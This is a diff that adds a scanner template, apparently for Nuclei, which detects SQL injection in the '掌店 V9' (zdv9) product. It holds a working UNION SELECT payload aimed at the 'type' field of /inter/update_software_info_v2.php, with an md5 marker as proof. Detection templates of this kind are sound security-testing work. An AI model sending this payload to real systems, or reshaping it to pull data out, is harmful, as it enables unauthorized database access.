@@ -1,0 +1,24 @@
+id: zdv9-sqli
+info:
+  name: 掌店 V9 - SQL 注入漏洞
+  author: Chaitin
+  severity: high
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: zdv9
+    product: zdv9
+  tags: sqli,vuln,zdv9
+variables:
+  s1: '{{to_string(rand_int(10000000, 99999999))}}'
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/inter/update_software_info_v2.php'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: type=-100+UNION+SELECT+1,md5({{s1}}),3,4,5,6,7,8--&key=&pageCount=0&curPage=
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, md5(s1))'
